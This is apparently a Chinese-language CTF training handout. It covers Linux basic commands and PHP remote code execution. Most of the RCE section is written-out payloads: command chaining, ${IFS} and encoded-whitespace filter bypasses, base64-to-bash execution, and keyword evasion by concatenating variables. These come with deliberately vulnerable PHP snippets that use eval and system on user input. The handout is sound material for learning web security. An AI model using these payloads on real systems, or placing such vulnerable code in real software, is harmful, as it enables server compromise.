<h2 id="YUdfh">Linux基础</h2>
<h3 id="Wqid3">环境搭建</h3>

+ VMware虚拟机
+ WSL：WSL（Windows Subsystem for Linux，Windows 下的 Linux 子系统）是 Microsoft 提供的一种功能，允许用户在不使用虚拟机或双系统的情况下，在 Windows 上运行原生的 Linux 环境。它使开发者可以直接在 Windows 中运行 Linux 命令行工具、脚本和程序，同时与 Windows 文件系统无缝集成。
+ 或者是服务器平台

<h3 id="VsyyN">了解linux</h3>

Linux 是一种开源的操作系统。它就像电脑的“灵魂”，控制着硬件并运行各种软件。更准确地说，Linux 最初指的是操作系统的内核（Kernel），是核心部分。但我们常说的“Linux”，通常指的是基于 Linux 内核构建的完整操作系统，它包含各种工具、应用程序和图形界面等

![](https://cdn.nlark.com/yuque/0/2025/jpeg/42549390/1752891808273-937fe8a5-c919-41b6-b781-71a5ca11628a.jpeg)

根目录`/`： 它是整个文件系统的顶层目录，所有其他目录都挂载在这个目录下。  
目录（`Directory`）： 类似于 `Windows` 的文件夹，用于组织和存储文件。  
文件（`File`）： 存储实际数据的地方，可以是文本文件、程序文件、图像文件等等。  
路径（`Path`）： 用于定位文件或目录的字符串，例如 `/home/user/documents/file.txt`。

+ 绝对路径： 从根目录 `/` 开始的完整路径，例如 `/etc/passwd`。
+ 相对路径： 相对于当前目录的路径，例如 `documents/file.txt`（如果当前目录是 `/home/user`）

<h3 id="WqlgU">基础命令</h3>

:::info

1. ls：列出目录内容

+ ls：列出当前目录的文件和文件夹。
+ ls -l：以详细列表形式显示。
+ ls -a：显示所有文件，包括隐藏文件。



2. cd：切换目录

+ cd 目录名：进入指定目录。
+ cd ..：返回上一级目录。
+ cd ~：回到用户的主目录。



3. pwd：显示当前所在目录



4. mkdir：创建目录

+ mkdir 目录名：创建一个新的目录。



5. touch：创建空文件

+ touch file.txt：创建一个名为 file.txt 的空文件。



6. cat：查看文件内容

+ cat file.txt：输出文件内容。
+ cat flag.txt：常用于查看 flag 内容。



7. echo：输出字符串或写入文件

+ echo hello：输出 hello。
+ echo hello > a.txt：写入到文件（覆盖）。
+ echo hello >> a.txt：追加到文件末尾。



8. cp：复制文件或目录

+ cp a.txt b.txt：复制文件。
+ cp -r dir1 dir2：递归复制目录。



9. mv：移动或重命名

+ mv a.txt b.txt：重命名或移动文件。



10. rm：删除文件或目录

+ rm a.txt：删除文件。
+ rm -r dir：删除目录及其内容。



11. chmod：修改权限

+ chmod +x script.sh：给文件添加可执行权限。



12. ps：查看进程

+ ps aux：查看所有进程。
+ ps -ef | grep nginx：查找特定进程。



13. top / htop：查看系统运行状况

+ top：实时显示进程状态。
+ htop：更好用的 top（需安装）。



14. netstat / ss：查看网络连接

+ netstat -anp：查看监听端口与进程（老旧系统）。
+ ss -tunlp：查看网络服务（更现代、推荐）。



15. ifconfig / ip a：查看网络信息

+ ifconfig：旧命令，显示 IP 信息。
+ ip a：现代命令，等效于 ifconfig。



16. wget / curl：下载文件

+ wget [http://example.com/file](http://example.com/file)
+ curl [http://example.com/file](http://example.com/file) -o file



17. uname：查看系统信息

+ uname -a：显示内核和架构等信息。



18. whoami：查看当前用户名



19. find：查找文件

+ find / -name flag.txt：全盘搜索 flag 文件。



20. grep：搜索字符串

+ grep root /etc/passwd：搜索包含 root 的行。



21. export：设置环境变量

+ export PATH=$PATH:/new/path



22. which / whereis：查命令路径

+ which python：查看可执行路径。

:::

<h2 id="iBBWE">PHP基础</h2>

看pdf加演示

<h2 id="xJ9W5">RCE</h2>

RCE（Remote Code Execution，远程命令执行）是指攻击者能够在目标服务器上执行任意代码的一种高危安全漏洞

刚才我们也学过linux的一些基础命令了，基础命令都是在终端运行的，RCE就是拿到终端的权限，这个时候我们就能对对方的电脑进行控制

今天主要涉及的内容就是PHP的RCE

<h3 id="Eg8Wy">PHP的危险函数</h3>

```java
system()：能将字符串作为OS命令执行，且返回命令执行结果；
  
exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)
  
shell_exec()：能将字符串作为OS命令执行

passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；
  
popen()：打开进程文件指针
  
proc_open()：与popen()类似
  
pcntl_exec()：在当前进程空间执行指定程序；
  
反引号``：反引号``内的字符串会被解析为OS命令；
  
assert() 会将字符串当做 PHP 代码来执行；

eval() 会将字符串当做 PHP 代码来执行；
```

<h3 id="twNA2">bypass</h3>
<h4 id="PONaq">bypass-1 基础</h4>

```java
<?php
eval($_GET[unjoke]);
?>
// unjoke=system("ls");

<?php
system($_POST[unjoke]);
?>
// unjoke=ls
```

这种rce没有任何的waf，这个时候我们只需要传入对应的执行就行了

<h4 id="XKkQL">bypass-2 命令拼接</h4>

```java
<?php
$cmd = "ping " . $_GET['unjoke'];
system($cmd);
?>

// unjoke=;ls
```

在linux中我们是支持命令拼接的，如下就是常见的拼接字符

```java
;：命令结束后执行下一条

&&：前一个成功再执行后一个

|：管道符

||：前一个失败才执行后一个

&：后台执行
```

<h4 id="IC5ok">bypass-3 常见过滤绕过</h4>

```java
过滤空格 → 使用 ${IFS}、${IFS%??}、$'\x20'
在 Bash、sh 等 Shell 环境中，IFS 定义了当 shell 解析字符串时用来分隔字段的字符。默认值是一个空格（space）、制表符（tab）和换行符（newline）。
● >  <  <> 重定向符
● %20(space)
● %09(相当于tab键)
● $IFS$9 
● ${IFS}（最好用这个）
● $IFS  
● {cat,flag.txt} 在大括号中逗号可起分隔作用


过滤字母 → 用环境变量组合，比如 ${PATH:0:1}、${HOME:0:1}

URL 编码：%0a, %0d

Base64 编码执行：echo bHM= | base64 -d | bash
```

unjoke-1

```java
<?php
$cmd = $_GET['cmd'] ?? '';
if (strpos($cmd, ' ') !== false) {
    die("Space not allowed!");
}
system($cmd);
?>

//cmd=ls${IFS}/

```

unjoke-2

```php
<?php
$cmd = $_GET['cmd'] ?? '';
if (preg_match('/\/| |/', $cmd)) {
  die("Letters not allowed!");
}
system($cmd);

//cmd=ls${IFS}$(echo${IFS}${PATH:0:1}${PATH:1:1})
```

unjoke-3

```php
<?php
$cmd = $_GET['cmd'] ?? '';
if (strpos($cmd, ';') !== false || strpos($cmd, ' ') !== false) {
    die("Bad character!");
}
system($cmd);


//cmd=ls%0a-l 或者 cmd=ls%09-la
```

unjoke-4

```php
<?php
$a = $_GET['a'] ?? '';
eval(base64_decode($a));

// a=c3lzdGVtKCdscyAtYWwnKTs=
```

```php
echo -n "system('ls -al');" | base64
```

<h4 id="BYs2I">bypass-4 无回显RCE</h4>

```php
<?php
exec($_GET[1]);

// 1=ls>1.txt
```

或者是反弹shell，反弹shell需要公网ip，一般都是利用vps来进行

<h4 id="RtDfX">bypass-5 变量拼接</h4>

常见于ban掉了关键的字符串组合，比如

```php
<?php
$cmd = $_GET['cmd'] ?? '';
if (preg_match('/cat|flag/', $cmd)) {
die("Letters not allowed!");
}
system($cmd);
```

```php
?cmd=a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
```

<h4 id="rVKS4">bypass-6 符号绕过</h4>

+ 单引号----`''`
+ 双引号---`""`
+ 反斜杠--- `\`

像上面的题一样，我们可以通过`ca''t ca""t c"a"t ca\t`这样来`bypass`

<h2 id="LA4rz">WEB的路</h2>

web其实入门很基础，可能你会一个F12打开网页前端源码你就是入门了，但是其实这只是冰山一角，后面还有top漏洞，java安全等等

你真正想要学好这个web，你就得做好吃苦的决心了

咱们web手主要是在战队负责CTF方向的web题目，以及省内的护网行动

保研加分什么的，正常学随便加满，但是也得浇一盆冷水，如果你只是混子，那么打比赛的路其实不适合你

然后我希望大家能活跃起来，不可能说你做我们留下来的作业一点问题都没有吧，你得来和我们主动交流沟通，我们才知道你们的缺点在哪里，普遍的问题是什么，希望都活跃起来，多多交流，平时闲聊也是没什么问题的，web有四个学长，问题多一点我们也能回答完



